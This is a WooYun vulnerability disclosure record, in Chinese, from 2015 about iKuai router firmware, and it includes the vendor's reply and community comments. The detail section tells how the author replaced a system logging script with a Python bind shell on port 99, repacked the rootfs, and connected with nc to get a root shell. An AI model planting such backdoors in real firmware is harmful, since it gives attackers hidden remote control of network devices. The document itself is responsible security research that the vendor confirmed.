{"id": 65369, "wybug_id": "wooyun-2015-0123582", "wybug_title": "爱快流控路由最新版固件漏洞挖掘分析之零（固件挂载分析技巧分享）", "wybug_corp": "爱快免费流控路由", "wybug_author": "Bear baby", "wybug_date": "2015-07-01 11:00", "wybug_open_date": "2015-09-29 13:28", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-29：\t细节向公众公开  简要描述： 固件版本：iKuai8_2.4.4_Build20150604-17_41固件下载地址：http://patch.ikuai8.com/iso/iKuai8_2.4.4_Build20150604-17_41.iso分析使用到的工具：EditPlus、DreamWeaver、Zend Studio、Ida Pro 6.1、BeyondCompare、Fiddler、中国菜刀、Kali、VisualStudio2010、vmware11等注：本文基于逆向获取到的源文件进行分析。 详细说明：  整个完整分析过程前前后后测试、截图、敲文字、贴代码、敲代码，搞了三十几页也是蛮拼的。\n\n前面提交的几个漏洞基本涵盖了爱快流控路由几大块比较致命的问题，本文之所以称作“零”是有依据的。因为前面的分析都是基于此，即我是怎么获取到源码的。下面简单说下，中间之曲折略去。下载的镜像安装在Vmware里面的，将爱快流控路由器虚拟机的硬盘挂载到Kali里面。\n\n将挂载的硬盘的一个分区里面的文件rootfs.gz 复制到桌面。开启一个终端，对复制rootfs.gz解压，mount到临时文件夹。如下图\n\n\nroot@kali:~# cd Desktoproot@kali:~/Desktop# lsData  rootfs.gzroot@kali:~/Desktop# mkdir tmp     //创建一个文件夹 等下固件mount到这个目录root@kali:~/Desktop# gunzip rootfs.gz //解压root@kali:~/Desktop# lsData  rootfs  tmproot@kali:~/Desktop# chmod u+rwx rootfs //设置权限root@kali:~/Desktop# sudo mount -o loop rootfs tmp/ //mount rootfs到tmp目录root@kali:~/Desktop# lsData  rootfs  tmproot@kali:~/Desktop# cd tmproot@kali:~/Desktop/tmp# lsbin  etc  lost+found  overlay  rom   sbin  tmp  vardev  lib  mnt         proc     root  sys   usr  www\n经过多次尝试失败后，最终通过修改usr/sbin/iksyslogd文件成功开起一个正向连接的shell。Ikusyslogd是一个python脚本，部分代码如下截图。目测表明是实现记录日志。\n\n\n\n\n\n把一个正向shell的python脚本直接覆盖到这个文件。Shell脚本如下(网上copy来的)：\nfrom socket import *import subprocessimport os, threading, sys, timeif __name__ == \"__main__\":        server=socket(AF_INET,SOCK_STREAM)        server.bind(('0.0.0.0',99))        server.listen(5)        print 'waiting for connect'        talk, addr = server.accept()        print 'connect from',addr        proc = subprocess.Popen([\"/bin/sh\",\"-i\"], stdin=talk,                stdout=talk, stderr=talk, shell=True)\n然后在终端umount rootfs，重新打包。\n\n\nroot@kali:~/Desktop# sudo umount tmp/ //umountroot@kali:~/Desktop# gzip rootfs\t\t  //打包root@kali:~/Desktop# lsData  rootfs.gz  tmp\n把挂载的硬盘从kali移除，爱快流控路由器虚拟机开机，等待开机完成后，在kali里面开一个终端，nc连接路由器99端口。（设置kali和爱快流控路由器虚拟机在同一个ip段）。如下图，至此成功获取到路由器的shell。 把里面的文件copy出来，此处略过不提。\n\n\n\n\nroot@kali:~# nc 192.168.1.1 99cat /etc/mini_httpd.confcgipat=**.php|**.cgidir=/usr/ikuai/wwwnochrootpidfile=/var/run/mini_httpd.piduser=root#ssl#certfile=/etc/mini_httpd.pem\n   漏洞证明：     修复方案：  本来是打算过几天发出来的。。还是整理了一下赶出来了。。宿舍断网，用的手机流量来发的。。可以安心去准备补考了。   版权声明：转载请注明来源 Bear baby@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-01 13:26 厂商回复： 前面的几篇已经处理和升级，这次的漏洞和另一个漏洞其实对用户还是有些影响，正在拼命让用户升级中，不管怎么说，再次申请感谢乌云和白帽子朋友 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-01 11:01 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  洞主给力啊，又学习到新姿势了！    \n     2015-07-01 11:03 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  好厉害    \n     2015-07-01 11:04 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  棒棒哒！    \n     2015-07-01 11:09 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  洞主身上缺挂件么    \n     2015-07-01 11:10 |    \t\thh2014 \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:40        | 继续)\t\t \n  犀利啊    \n     2015-07-01 11:13 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  厉害！洞主求签名啊    \n     2015-07-01 11:17 |    \t\tF4K3R \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:31        | 学习)\t\t \n  之前分析是把它挂载在LINUX下，CD进目录分析文件，！还有一种方法是用虚拟机安装，然后把磁盘共享出来，可以拿到里面的文件。    \n     2015-07-01 12:12 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @F4K3R 作者这个思路特别奇葩，可以关注一下：）    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}